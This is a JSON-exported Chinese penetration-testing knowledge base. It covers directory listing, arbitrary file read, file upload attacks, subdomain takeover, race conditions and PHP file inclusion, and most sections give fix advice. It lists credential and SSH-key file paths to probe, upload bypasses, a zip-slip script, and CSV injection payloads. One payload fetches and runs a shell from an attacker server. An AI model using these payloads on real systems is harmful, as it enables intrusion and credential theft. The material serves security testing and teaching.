测试过程中，手动删除接口部分，保留文件夹；如blog.gm7.org/manager/d4m1ts.html删除最后的d4m1ts.html，访问blog.gm7.org/manager/就可能存在列目录漏洞 被动 1、利用Google Hacking intitle:\"Index of /\" 2、利用网络空间搜索引擎 修复方案 IIS 打开 IIS 管理器，然后导航至您要管理的网站； 在“功能视图”中，双击“目录浏览”； 在“操作”窗格中，选择“目录浏览”功能，单击“禁用”； 重启 IIS 服务 Apache 修改Apache配置文件[httpd.conf]，搜索“Options Indexes FollowSymLinks”，修改为“Options -Indexes FollowSymLinks”即可；修改后重启Apache服务。 -Indexes 的作用就是当该目录下没有 index.html 文件时，就显示目录结构，去掉 Indexes，Apache 就不会显示该目录的列表了。 在Indexes前，加 + 代表允许目录浏览；加 – 代表禁止目录浏览。这样的话就属于整个Apache禁止目录浏览了。 通过.htaccess文件 可以在根目录新建或修改 .htaccess 文件中添加如下代码就可以禁止Apache显示目录索引: Options -Indexes Nginx Nginx中默认不会开启目录浏览功能，若您发现当前已开启该功能，可以编辑nginx.conf文件，删除如下两行，并重启Nginx服务： autoindex on; autoindex_exact_size on; Tomcat 在应用的WEB-INF目录找到web.xml配置文件，将“listings”参数的初始化值设置为“false”并重启Tomcat服务即可。代码示例如下： default org.apache.catalina.servlets.DefaultServlet debug 0 listings false 1 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-02-11 14:31:54 "},"个人知识库/01.渗透测试/02.WEB漏洞/15.任意文件下载:读取/":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/15.任意文件下载:读取/","title":"15.任意文件下载:读取","keywords":"","body":" 介绍 漏洞挖掘 常见情况 配置问题 利用思路 常见文件 Windows Linux 绕过手法 修复建议 介绍 一些网站由于业务需要，可能提供文件查看或下载的功能，如果对用户查看或下载的文件不做限制，攻击者就能够通过回溯符../或绝对路径跳转到任意目录查看或下载任意的文件；这可能是代码源文件，敏感配置文件等等，在特定的场景下，还可能造成SSRF漏洞。 漏洞挖掘 常见情况 主要还是观察数据包，分析每个参数，以及每个参数代表的作用。 常见功能点：读取/下载图片、文件内容；下载附件；预览文档；导出文档；修改、保存文档等 比如：filename=aaa，那么这个aaa可能就是代表的服务器上某个文件，尝试修改它为/etc/passwd等对应系统存在且有权限访问的文件即可。 常见参数： 如果在测试过程中发现这些参数，可以多留意分析尝试。 &RealPath= &FilePath= &file= &filename= &Path= &path= &inputFile= &url= &urls= &Lang= &dis= &data= &readfile= &filep= &src= &menu= &META-INF= &WEB-INF= 配置问题 一些应用或者服务器可能配置存在问题，导致可以直接回溯目录读取任意文件 如：Grafana任意文件读取漏洞（CVE-2021-43798） 利用思路 查看常规的配置文件，如ssh、数据库、ftp等 查看常规的包含敏感信息的文件，如各用户的.bash_history等 查看网站日志access.log，找找网站后台、用户密码、别人的shell等 查看源代码进行审计 ... [!TIP|style:flat] 总体来说，就是到处翻文件，找对我们渗透有帮助的文件获取信息即可。 常见文件 Windows Fuzz_dict Windows任意文件下载的三个Tips C:\\windows\\win.ini //可以用来判断是否为windows系统 C:\\boot.ini //查看系统版本 C:\\Windows\\System32\\inetsrv\\MetaBase.xml //IIS 配置文件 C:\\Windows\\repair\\sam //存储系统初次安装的密码 C:\\Program Files\\mysql\\my.ini //Mysql 配置 C:\\Program Files\\mysql\\data\\mysql\\user.MYD //Mysql root C:\\Windows\\php.ini //php 配置信息 C:\\Windows\\my.ini //Mysql 配置信息 # 需要管理员权限 %ProgramData%\\Microsoft\\Search\\Data\\Applications\\Windows\\Windows.edb %ProgramData%\\Microsoft\\Search\\Data\\Applications\\Windows\\GatherLogs\\SystemIndex 目录下文件名类似SystemIndex.[数字序号].gthr %systemroot%\\System32\\winevt\\Logs目录下的evtx日志文件，名字固定如下 Application.evtx ConnectionInfo.evtx Error.evtx HardwareEvents.evtx Internet Explorer.evtx Key Management Service.evtx Media Center.evtx Microsoft-Windows-API-Tracing%4Operational.evtx Microsoft-Windows-AppID%4Operational.evtx Microsoft-Windows-Application Server-Applications%4Admin.evtx Microsoft-Windows-Application Server-Applications%4Operational.evtx Microsoft-Windows-Application-Experience%4Problem-Steps-Recorder.evtx Microsoft-Windows-Application-Experience%4Program-Compatibility-Assistant.evtx Microsoft-Windows-Application-Experience%4Program-Compatibility-Troubleshooter.evtx Microsoft-Windows-Application-Experience%4Program-Inventory.evtx Microsoft-Windows-Application-Experience%4Program-Telemetry.evtx .........省略 # 不需要管理员权限 %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt # 类似.bash_history %userprofile%\\appdata\\local\\iconcache.db # 类似locate的db文件 Linux Fuzz_dict /etc/passwd /etc/shadow /etc/hosts /var/lib/mlocate/mlocate.db // locate命令的索引数据库文件，每天更新一次，大宝贝 /root/.bash_history //root 的 bash 历史记录 /root/.mysql_history //mysql 的 bash 历史记录 /root/.wget-hsts /opt/nginx/conf/nginx.conf //nginx 的配置文件 /var/www/html/index.html /etc/redis.conf /etc/my.cnf /etc/httpd/conf/httpd.conf //httpd 的配置文件 /proc/self/fd/fd[0-9]*(文件标识符) /proc/mounts /porc/config.gz /proc/sched_debug // 提供 cpu 上正在运行的进程信息，可以获得进程的 pid 号，可以配合后面需要 pid的利用 /proc/mounts // 挂载的文件系统列表 /proc/net/arp //arp 表，可以获得内网其他机器的地址 /proc/net/route //路由表信息 /proc/net/tcp and /proc/net/udp // 活动连接的信息 /proc/net/fib_trie // 路由缓存 /proc/version // 内核版本 /proc/[PID]/cmdline // 可能包含有用的路径信息 /proc/[PID]/environ // 程序运行的环境变量信息，可以用来包含 getshell /proc/[PID]/cwd // 当前进程的工作目录 /proc/[PID]/fd/[#] // 访问 file descriptors，某写情况可以读取到进程正在使用的文件，比如access.log 其会去保存文档和目录名称到数据库内(这个数据库中含有本地所有文件信息。Linux系统自动创建这个数据库，并且每天自动更新一次)，然后查找合乎范本样式条件的文档或目录。一般这个数据库的位置在: # ssh相关 /root/.ssh/id_rsa /root/.ssh/id_rsa.pub /root/.ssh/authorized_keys /root/.ssh/known_hosts //记录每个访问计算机用户的公钥 /etc/ssh/sshd_config /var/log/secure /etc/sysconfig/network-scripts/ifcfg-eth0 /etc/syscomfig/network-scripts/ifcfg-eth1 locate.db介绍： Linux locate命令用于查找符合条件的文档。一般情况我们只需要输入locate your_file_name 即可查找指定文件: locate [-d ][--help][--version][范本样式...] 其会去保存文档和目录名称到数据库内(这个数据库中含有本地所有文件信息。Linux系统自动创建这个数据库，并且每天自动更新一次)，然后查找合乎范本样式条件的文档或目录。一般这个数据库的位置在: /var/lib/mlocate/mlocate.db 寻找mlocate.db中所有带有properties的路径 locate mlocate.db properties 绕过手法 双写：适用于对../置空的情况，如..././config 去掉../的结果为../config 编码：URL编码、两次URL编码、十六进制编码等；URL编码一般后端会解析一次，其他的编码需要分析服务端是否会进行解析 HPP、分块传输、填充垃圾字符：比较通用 修复建议 在配置文件中限制访问的文件目录 检查用户输入，过滤或转义含有../、..\\、%00，..，./，#等跳转目录或字符终止符、截断字符的输入 严格过滤用户输入字符的合法性，比如文件类型、文件地址、文件内容等 白名单限定访问文件的目录、路径、名称 白名单限定访问文件的后缀如jpg、gif、png、rar、zip、pdf、doc、xls、ppt等 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-02-11 15:29:47 "},"个人知识库/01.渗透测试/02.WEB漏洞/16.文件上传/":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/16.文件上传/","title":"16.文件上传","keywords":"","body":" 简介 靶场推荐 漏洞危害 挖掘判断 绕过方法 可解析后缀 Content-Type 文件头 图片马 条件竞争 二次渲染 双上传 多分号上传 HPP 修复建议 文件上传FUZZ 简介 文件上传漏洞，字如其意，就是可能出现在一切允许上传文件的功能点； 它是指由于程序员未对上传的文件进行严格的验证和过滤，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。这里上传的文件可以是木马，病毒，恶意脚本或者WebShell等。这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。 靶场推荐 upload-labs upload-labs-writeup 漏洞危害 允许上传脚本语言文件且解析 ==> getshell 允许上传html ==> xss、csrf、登陆劫持... 允许上传压缩包 ==> 压缩包DOS、解压文件getshell 允许上传pdf ==> pdf xss 允许上传swf ==> swf xss 允许上传excel、docx ==> xxe ... [!tip|style:flat] https://twitter.com/Eyhuss1/status/1492507581084053508 asp, aspx, php : webshell, rce svg: stored xss, ssrf, xxe gif: stored xss, ssrf csv: csv injection xml: xxe avi: lfi,ssrf html, js: html injection, xss, open redirect png: pixel flood attack, dos zip: rce via lfi, dos pdf: ssrf, blind xxe, Stored XSS 挖掘判断 [!NOTE] 主要过程还是上传正常的图片抓包，再判断一下后端的过滤规则有哪些，再针对这些规则来分析绕过 黑白名单 内容是否有判断 是否二次渲染 是否有解析漏洞 图自：https://github.com/c0ny1/upload-labs/raw/master/doc/sum_up.png 绕过方法 图自：https://github.com/c0ny1/upload-labs/blob/master/doc/mind-map.png 可解析后缀 语言 可解析后缀 asp/aspx asp,aspx,asa,asax,ascx,ashx,asmx,cer,aSp,aSpx,aSa,aSax,aScx,aShx,aSmx,cEr php php,php5,php4,php3,php2,pHp,pHp5,pHp4,pHp3,pHp2,html,htm,phtml,pht,Html,Htm,pHtml jsp jsp,jspa,jspx,jsw,jsv,jspf,jtml,jSp,jSpx,jSpa,jSw,jSv,jSpf,jHtml Content-Type 常见类型见下： 文件类型 Content-type 超文本标记语言文本 .html,.html text/html 普通文本 .txt text/plain RTF文本 .txt text/plain GIF图形 .gif image/gif JPEG图形 .jpeg,.jpg image/jpeg au声音文件 .au audio/basic MIDI音乐文件 .mid,.midi audio/midi,audio/x-midi RealAudio音乐文件 .ra, .ram audio/x-pn-realaudio MPEG文件 .mpg,.mpeg video/mpeg AVI文件 .avi video/x-msvideo GZIP文件 .gz application/x-gzip TAR文件 .tar application/x-tar fuzz dict 下载 文件头 文件幻数是用来唯一标识文件类型的一系列数字（十六进制），也就是我们常说的文件头，当白名单限制了文件幻数时，我们就要给我们的文件制造可以通过检测的文件头即可： .jpg Value = FF D8 FF E0 .gif Value = 47 49 46 38 ==> GIF89a .png Value = 89 50 4E 47 .html Value = 68 74 6D 6C 3E 10 .xml Value = 3C 3F 78 6D 6C 图片马 如果后缀可以为jsp、php等，但是内容必须为图片，那么可以用图片马来进行getshell 或者会解析图片为相关的代码 Windows copy 1.jpg/b+1.php/a 2.jpg *nix（我失败了） cat file1.txt >> file2.jpg cat file1.txt file2.jpg >> file3.jsp 条件竞争 如果网站的文件上传的过程是：服务器获取文件–>保存上传临时文件–>重命名移动临时文件 这样的步骤时，就可以通过不断地对文件进行上传和访问，从而使服务器还未重命名移动临时文件时，我们就利用时间差打开了文件，成功执行其中的恶意代码。 具体方法：并发发包，如Burp、fuff等 二次渲染 二次渲染的工具可能存在RCE等漏洞，如ImageMagick 通过十六进制寻找二次渲染后内容未改变的部分，再在其中插入代码，一般在exif数据中 双上传 和标题一个意思，同时构造两个上传，也就是两个Content-Disposition:，可能服务端只会验证第一个上传，而第二个上传则直接保存 多分号上传 Content-Disposition: form-data;name=\"file\";;;filename=\"1.jsp\" HPP 算是各处都会用到的一些方法吧，上传的时候构造2个filename，如： filename=1.png; filename=1.jsp 修复建议 后缀白名单，只允许上传jpg、jpeg、png、gif 内容完整性检测 WAF 文件上传FUZZ upload-fuzz-dic-builder 构造优质上传漏洞fuzz字典 Upload Insecure Files Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-02-24 15:42:23 "},"个人知识库/01.渗透测试/02.WEB漏洞/16.文件上传/01.文件上传攻击面.html":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/16.文件上传/01.文件上传攻击面.html","title":"01.文件上传攻击面","keywords":"","body":" 前言 允许直接上传shell 允许上传压缩包 允许上传HTML或SVG 允许上传CSV 允许上传XML格式文件并解析 允许上传PDF 允许上传大文件 像素洪水攻击 会对图片二次渲染 不会对上传文件重命名 服务端的注入 元数据泄漏 插件 参考文章 前言 对文件上传漏洞介绍文章中 漏洞危害 部分的补充和完善，主要介绍文件上传功能点有哪些攻击面。 文章内容主要围绕下方的思维导图 允许直接上传shell 只要有文件上传功能，那么就可以尝试上传webshell直接执行恶意代码，获得服务器权限，这是最简单也是最直接的利用。 允许上传压缩包 如果可以上传压缩包，并且服务端会对压缩包解压，那么就可能存在Zip Slip目录走访漏洞；恶意攻击者通过构造一个压缩文件条目中带有../的压缩文件，上传后交给应用程序进行解压，由于程序解压时没有对压缩包内部的文件名进行合法性的校验，而是直接将文件名拼接在待解压目录后面，导致可以将文件解压到正常解压缩路径之外并覆盖可执行文件，从而等待系统或用户调用他们实现代码执行（也可能是覆盖配置文件或其他敏感文件）。 本质： 没有对压缩包中的文件名进行合法性校验，直接将文件名拼接到待解压目录中，导致存在路径遍历风险 举例： 若解压目录为/webapp/web/，给文件命名为：../../var/www/html/1.php并压缩，那么文件解压后，通过直接拼接文件名为/webapp/web/../../var/www/html/1.php，因此最终就会存放到/var/www/html/1.php中，如果能访问并解析，那么就能成功代码执行。 利用： zip-slip-vulnerability这个仓库包含了有关此攻击的所有信息，例如受影响的库、项目和其他相关信息。 构造代码： 也可以用别人写好的工具：https://github.com/ptoomey3/evilarc import zipfile # the name of the zip file to generate zf = zipfile.ZipFile('out.zip', 'w') # the name of the malicious file that will overwrite the origial file (must exist on disk) fname = 'zip_slip.txt' #destination path of the file zf.write(fname, '../../../../../../../../../../../../../../../../../../../../../../../../tmp/zip_slip.aaa') 允许上传HTML或SVG 允许上传html或者svg都可以能导致xss，也能导致任意URL跳转，甚至还能导致SSRF（很难利用），因为核心还是js代码可控 html造成XSS就不多说了，懂得都懂 主要说说svg文件如何造成xss 检查思路： 创建一个恶意的svg文件，输入如下内容： alert(document.domain); 上传到文件中，并访问 [!tip|style:flat] 如果目标存在导出功能，如给svg导出为pdf这种功能，那么可能存在SSRF 可尝试使用其他协议更直观的查看，如file:// 允许上传CSV 如果允许上传CSV文件，且上传的CSV文件的内容未经过处理过滤直接保存，那么可以尝试上传具有恶意命令执行payload的CSV文件，当其他用户下载该CSV文件时，可能会导致命令执行。 CSV Payload DDE (\"cmd\";\"/C calc\";\"!A0\")A0 @SUM(1+9)*cmd|' /C calc'!A0 =10+20+cmd|' /C calc'!A0 =cmd|' /C notepad'!'A1' =cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0 =cmd|'/c rundll32.exe \\\\10.0.0.1\\3\\2\\1.dll,0'!_xlbgnm.A1 检查思路： 上传恶意的CSV文件 下载恶意的CSV文件 观察下载后的CSV文件是否对等号=等特殊符号做了处理，payloads会否会成功执行，如果能则说明存在问题 允许上传XML格式文件并解析 如果允许上传XML格式文件，如docx、xlsx、svg等本质是xml的文件，且后端会对上传的文件进行解析，那么可能存在XXE 以恶意svg为例，一般尝试OOB外带注入的方式来判断最快 ]>&xxe; 恶意的XXE文档生成：docem 允许上传PDF 可能存在PDF XSS和任意URL跳转，但是由于属于浏览器层面的漏洞，所以厂商大概率不认可。 可以直接使用工具生成：https://github.com/harunoz/js_pdf_xss.git 也可以按照网上的操作，用迅捷PDF编辑器去操作，效果都一样 允许上传大文件 文件上传的时候，服务端通常会对上传的文件进行大小限制，范围一般为5MB-200 MB，甚至更小/更大，具体取决于应用程序逻辑。但是如果未限制文件大小或不存在相关的验证检查，那么攻击者可能会上传相对较大的文件，造成大量资源消耗，从而可能导致拒绝服务。 检查思路： 创建一个超大的图片文件，如500M的png，并上传图片 新开一个浏览器页面或从另一台设备浏览网站，查看响应速度是否变慢或是否存在连接错误等异常情况 像素洪水攻击 任意可以上传图片的地方都可以进行测试；在Pixel Flood Attack中，攻击者尝试上传具有大像素的文件（64250x64250像素），一些应用会使用第三方组件/库对图像进行缩小处理，以节省存储空间和处理能力，但是这些第三方库在处理的时候，会将“整个图像”加载到内存中，它会尝试将4128062500像素分配到内存中，从而消耗服务器资源，导致应用最终崩溃宕机。 检查思路： 在https://www.resizepixel.com/中调整图片大小为 64250x64250，上传图片（现在好像不行了，所以我找了个直接能用的 pixel_flood_lottapixel.jpg） 新开一个浏览器页面或从另一台设备浏览网站，查看响应速度是否变慢或是否存在连接错误等异常情况 hackerone $500 实例 会对图片二次渲染 若服务端使用存在漏洞的组件对上传图片进行二次渲染等操作，那么也可以尝试RCE，如ImageMagick 一些ImageMagick相关的CVE： CVE-2016–3714 — Insufficient shell characters filtering leading to (potentially remote) code execution CVE-2016–3715 — File deletion CVE-2016–3716 — File moving CVE-2016–3717 — Local file read CVE-2016–3718 — SSRF 不会对上传文件重命名 一些网站配置不当，或者开发安全意识不严谨，将用户上传的文件直接按原名存储到服务器中，那么我们就可以尝试将文件名添加回溯符../，以上传文件到任意目录，甚至覆盖文件，达到getshell或者破坏系统的目的。 [!tip] 在windows中由于部分符号不能作为文件名，如果我们将文件名设置为带有这些特殊符号的内容，那么可能让服务器抛出异常 较少的情况下，可以控制上传的目录名，也可以通过路径遍历的方法上传到任意目录中。 如将文件名设置为../../../../etc/passwd，然后上传对应的内容，那么则有可能直接覆盖掉/etc/passwd 一般情况下尽量去覆盖不会对系统产生影响且我们可以直接观察到的文件，如robots.txt等 服务端的注入 服务端可能对上传的文件名进行各种处理，如展示到页面、存储到数据库等，因此可能存在各种各样的注入，如XSS、SQLI等 如上传文件名为test.png，那么我们可以设置变量为§test§.png，然后fuzz一下各种注入的payload，如sleep(10)-- -.png、test.png、${2*3} 等 元数据泄漏 元数据是照片背后的故事，它告诉我们图像文件是如何创建的，在哪里和何时创建的。它还描述了照片的内容，确定了摄影师，并向您展示了图像在后期处理中是如何编辑的。简单地说，假设您使用数码相机单击了一张图片，当该图像被处理并保存在存储设备上时，一些属性被添加到文件中，例如作者、位置、设备信息和其他适用于描述图像信息的信息。 如果服务端对用户上传的图片未进行处理就直接展示，那么将可能会导致源数据泄漏；通常情况下，元数据中包含GPS地址、设备信息等，会被当作低危。 [!note] 元数据泄漏不仅限于图片，还可以在其他文件格式中找到，如PDF 检查方法： 在头像上传等图片可以被枚举的功能点上传包含有exif敏感信息的图片，没有的话可以用手机现拍 下载刚才上传的图片（如果用下面的在线平台这一步可以省略） 使用 http://exif.regex.info/exif.cgi 或者 exiftool 去分析数据 插件 参考文章 File Upload Attacks (Part 1) File Upload Attacks (Part 2) Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-02-24 16:06:55 "},"个人知识库/01.渗透测试/02.WEB漏洞/17.子域名接管/":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/17.子域名接管/","title":"17.子域名接管","keywords":"","body":" 前言 核心 参考 前言 国内的子域名接管漏洞比较少 今天遇到一个pagewiz的网站疑似存在子域名接管，然后去尝试了一下，失败了，所以觉得还是有必要先占个位，等以后遇到成功案例再写 核心 copy自：https://github.com/EdOverflow/can-i-take-over-xyz Engine Status Fingerprint Discussion Documentation Acquia Not vulnerable Web Site Not Found Issue #103 Agile CRM Vulnerable Sorry, this page is no longer available. Issue #145 Airee.ru Vulnerable Issue #104 Anima Vulnerable If this is your website and you've just created it, try refreshing in a minute Issue #126 Anima Documentation Akamai Not vulnerable Issue #13 AWS/S3 Vulnerable The specified bucket does not exist Issue #36 AWS/Load Balancer (ELB) Not Vulnerable status NXDOMAIN and CNAME pointing to XYZ.elb.amazonaws.com Issue #137 Bitbucket Vulnerable Repository not found Campaign Monitor Vulnerable Trying to access your account? Support Page Cargo Collective Vulnerable 404 Not Found Issue #152 Cargo Support Page Cloudfront Not vulnerable ViewerCertificateException Issue #29 Domain Security on Amazon CloudFront Desk Not vulnerable Please try again or try Desk.com free for 14 days. Issue #9 Digital Ocean Vulnerable Domain uses DO name serves with no records in DO. Discourse Vulnerable Hackerone Fastly Edge case Fastly error: unknown domain: Issue #22 Feedpress Not vulnerable The feed has not been found. Issue #80 Firebase Not vulnerable Issue #128 Fly.io Vulnerable 404 Not Found Issue #101 Freshdesk Not vulnerable We couldn't find servicedesk.victim.tld Maybe this is still fresh! You can claim it now at http://www.freshservice.com/signup Issue #214 Freshdesk Support Page Gemfury Vulnerable 404: This page could not be found. Issue #154 Article Ghost Vulnerable The thing you were looking for is no longer here, or never was Github Vulnerable There isn't a GitHub Pages site here. Issue #37 Issue #68 Gitlab Not vulnerable HackerOne #312118 Google Cloud Storage Not vulnerable NoSuchBucketThe specified bucket does not exist. HatenaBlog vulnerable 404 Blog is not found Help Juice Vulnerable We could not find what you're looking for. Help Juice Support Page Help Scout Vulnerable No settings were found for this company: HelpScout Docs Heroku Edge case No such app Issue #38 HubSpot Not vulnerable This page isn’t available Instapage Not vulnerable Issue #73 Intercom Vulnerable Uh oh. That page doesn't exist. Issue #69 Help center JetBrains Vulnerable is not a registered InCloud YouTrack YouTrack InCloud Help Page Key CDN Not vulnerable Issue #112 Kinsta Vulnerable No Site For Domain Issue #48 kinsta-add-domain Landingi Edge case It looks like you’re lost... Issue #117 LaunchRock Vulnerable It looks like you may have taken a wrong turn somewhere. Don't worry...it happens to all of us. Issue #74 Mashery Edge Case Unrecognized domain HackerOne #275714, Issue #14 Microsoft Azure Vulnerable Issue #35 Netlify Edge Case Not Found - Request ID: Issue #40 Ngrok Vulnerable Tunnel *.ngrok.io not found Issue #92 Ngrok Documentation Pantheon Vulnerable 404 error unknown site! Issue #24 Pantheon-Sub-takeover Pingdom Vulnerable Sorry, couldn't find the status page Issue #144 Support Page Readme.io Vulnerable Project doesnt exist... yet! Issue #41 Sendgrid Not vulnerable Shopify Edge Case Sorry, this shop is currently unavailable. Issue #32, Issue #46 Medium Article Short.io Vulnerable Link does not exist Issue #260 SmartJobBoard Vulnerable This job board website is either expired or its domain name is invalid. Issue #139 Support Page Smartling Edge Case Domain is not configured Issue #67 Squarespace Not vulnerable Statuspage Not Vulnerable Status page pushed a DNS verification in order to prevent malicious takeovers what they mentioned in This Doc PR #105 and PR #171 Statuspage documentation Strikingly Vulnerable page not found Issue #58 Strikingly-Sub-takeover Surge.sh Vulnerable project not found Surge Documentation Tumblr Vulnerable Whatever you were looking for doesn't currently exist at this address Issue #240 Tumblr Custom Domains Tilda Edge Case Please renew your subscription Issue #155PR #20 Uberflip Vulnerable Non-hub domain, The URL you've accessed does not provide a hub. Issue #150 Uberflip Documentation Unbounce Not Vulnerable The requested URL was not found on this server. Issue #11 Uptimerobot Vulnerable page not found Issue #45 Uptimerobot-Sub-takeover UserVoice Vulnerable This UserVoice subdomain is currently available! Webflow Edge Case The page you are looking for doesn't exist or has been moved. Issue #44 forum webflow Wix Edge Case Looks Like This Domain Isn't Connected To A Website Yet! Issue #231 Wordpress Vulnerable Do you want to register *.wordpress.com? Worksites Vulnerable Hello! Sorry, but the website you’re looking for doesn’t exist. Issue #142 WP Engine Not vulnerable Zendesk Not vulnerable Help Center Closed Issue #23 Zendesk Support 参考 nuclei-templates takeovers poc can-i-take-over-xyz Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-02-25 21:10:19 "},"个人知识库/01.渗透测试/02.WEB漏洞/18.条件竞争/":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/18.条件竞争/","title":"18.条件竞争","keywords":"","body":" 介绍 举例 应用场景 购买 绕过次数操作 绕过多过程处理 修复建议 扩展 参考 介绍 条件竞争漏洞发生在多个线程同时访问同一个共享代码、变量、文件等，但没有进行锁操作或者同步操作的场景中。这个漏洞存在于操作系统、数据库、web等多个层面，像有名的脏牛（dirty cow）。 条件竞争漏洞属于服务器端漏洞，由于大多服务端框架在处理不同用户的请求时是并发进行的，而开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果； [!tip] 简单来说，就是多线程同时操作一个对象，而没有对对象进行加锁等保证一致性的操作 举例 以python多线程代码举一个不恰当的例子 #!/usr/bin/env python from concurrent.futures import ThreadPoolExecutor def test(): global globalNum if globalNum >= 5: print(\"globalNum >= 5 now\") globalNum -= 1 if __name__ == '__main__': globalNum = 5 pool = ThreadPoolExecutor(max_workers=10) for _ in range(5): pool.submit(test) 咋一看，globalNum初始值为5，一个5次的for循环，每次globalNum-1，那么按理说只有第一次调用test函数的时候print会有输出才对，但是我们运行起来看看结果，却有2次print输出 而产生这种结果的原因，就是多线程同时操作变量globalNum，globalNum还没来得及完成修改就被带入到另一个test()函数中，也就是对并发操作的敏感变量没有加锁保护等。 应用场景 [!note] 结合参数在后端的处理过程，所有后端应该对数据进行加锁或者同步的功能点，都可能存在此漏洞，如购买、签到、转账、兑换等 总的来说有如下几类： 购买/兑换操作 绕过次数限制 绕过多过程处理 下面举几个例子抛砖引玉 购买 假设：用户A有100元，要买一件100元的商品 且后端处理流程：判断A的余额是否>=100 ==> A的余额-100，商品数量+1 （没有对A的余额进行加锁操作） 正常情况下，A购买完一件商品余额就清零了，但攻击者通过并发发起20个请求，后端接收到后，也会并发发起20次上述的处理流程，而在同一时间（A的余额-100之前）去判断A的余额是否>=100，肯定都是满足的，那么商品数量就会多次+1，也就达到了100元购买多件100元商品的目的 [!tip] 这个漏洞具有偶现性，很受环境因素的影响，比如网络延迟、服务器的处理能力等，所以只执行一次可能并不会成功，尽量多尝试几次 绕过次数操作 最容易想到的就是绕过签到次数限制，大多数平台都是一天只允许签到一次，如果后端对是否签到的判断不严，那么我们就可以通过并发达到一天签到多次的目的。这里举一个之前类似的挖到的某网盘绕过大小限制的操作。 前提：该云盘普通用户只允许上传10G空间，想要获得更大的空间就需要开会员 猜测后端处理过程：识别上传文件大小 ==> 当前已用空间+上传文件大小是否>=10G ==> 10G，上传失败 我的测试过程：怀疑上传过程中，后端可能没有对已用空间做加锁机制来防止并发操作带来的条件竞争问题，因此我先上传了1G的文件，然后50个线程并发复制这1个文件，最终成功上传了超过10G的文件到服务器中。 绕过多过程处理 这个也是大家听说过最多的，常用的场景：上传webshell时，服务端会先存储该文件，然后判断文件内容是否包含恶意内容，如果包含就删除； 我们可以通过并发不停的向服务器上传webshell，虽然服务器会不断的检查并删除我们上传的文件，但由于我们在一直不间断的上传，服务器可能会还没来得及删除webshell，我们就已经执行了相关的命令达到目的了。 修复建议 对于业务端条件竞争的防范，一般的方法是给对象加锁； 对于文件上传，一定要经过充分完整的检查之后再上传； 在操作系统的角度，共享数据要进行上锁保护。 扩展 前面一直在说加锁加锁，到底什么是加锁？ 线程编程中，为了保证数据操作的一致性，操作系统引入了锁机制，用于保证临界区代码的安全。通过锁机制，能够保证在多核多线程环境中，在某一个时间点上，只能有一个线程进入临界区代码，从而保证临界区中操作数据的一致性。 临界区指的是一个访问共用资源（例如：共用设备或是共用存储器）的程序片段，而这些共用资源又无法同时被多个线程访问的特性。 参考 条件竞争（Race condition）漏洞挖掘技巧及实战案例 Copyright © d4m1ts 2022 all right reserved，powered by Gitbook该文章修订时间： 2022-03-01 16:25:48 "},"个人知识库/01.渗透测试/02.WEB漏洞/19.文件包含漏洞/":{"url":"个人知识库/01.渗透测试/02.WEB漏洞/19.文件包含漏洞/","title":"19.文件包含漏洞","keywords":"","body":" 介绍 文件包含漏洞分类 LFI RFI PHP的文件包含函数 漏洞示例代码 利用 任意文件读取 使用PHP封装协议 php://filter php://input RFI getshell LFI+文件上传 getshell LFI+日志文件 getshell LFI+/proc/self/environ getshell LFI+phpinfo getshell LFI+session getshell 绕过 指定前缀 指定后缀 修复建议 参考 介绍 文件包含漏洞属于代码注入漏洞，为了减少重复代码的编写，引入了文件包含函数，通过文件包含函数将文件包含进来，直接使用包含文件的代码；简单来说就是一个文件里面包含另外一个或多个文件。 但我们除了包含常规的代码文件外，包含的任意后缀文件都会被当作代码执行，因此，如果有允许用户控制包含文件路径的点，那么则很有可能包含非预期文件，从而执行非预期的代码导致getshell。 几乎所有的脚本语言中都会提供文件包含的功能，但文件包含漏洞在PHP Web Application中居多，在JSP、ASP中十分少甚至没有，问题在于语言设计的弊端。因此后续均以PHP为主。 文件包含漏洞分类 PHP中的文件包含分为本地文件包含和远程文件包含。 LFI 本地文件包含 Local File Include (LFI) 所包含文件内容符合PHP语法规范，任何扩展名都可以被PHP解析。 所包含文件内容不符合PHP语法规范，会暴露其源代码（相当于文件读取）。 RFI 远程文件包含 Remote File Include (RFI) 如果要使用远程包含功能，首先需要确定PHP是否已经开启远程包含功能选项（php默认关闭远程包含功能：allow_url_include=off），开启远程包含功能需要在php.ini配置文件中修改。 远程包含与本地包含没有区别，无非是支持远程加载，更容易getshell，无论是哪种扩展名，只要遵循PHP语法规范，PHP解析器就会对其解析。 PHP的文件包含函数 PHP中提供了四个文件包含的函数，分别是include()、include_once()、require()和require_once()。这四个函数都可以进行文件包含，但作用并不一样。 - include：找不到被包含的文件时只会产生警告，脚本将继续执行。 - include_once：和include()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。 - require：找不到被包含的文件时会产生致命错误，并停止脚本。 - require_once：和require()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。 漏洞示例代码 快速启动一个简单的解析php的web server php -S 127.0.0.1:9999 测试： http://127.0.0.1:9999/index.php?file=/etc/passwd 利用 任意文件读取 如果内容不符合php语法，就会直接返回文件内容，也就等于读取任意文件，和任意文件读取/下载一样，就不细说了，敏感文件路径可以参考我的另一篇文章：任意文件下载/读取 使用PHP封装协议 PHP带有很多内置URL风格的封装协议 php://filter 正常情况下，包含php文件会直接执行其中的代码，但如果我们想获取到php文件的源码，如config.php，那么我们可以通过封装协议php://filter来读取 http://127.0.0.1:9999/index.php?file=php://filter/read=convert.base64-encode/resource=shell.png php://input 利用条件：需要开启allow_url_include=on，对allow_url_fopen不做要求 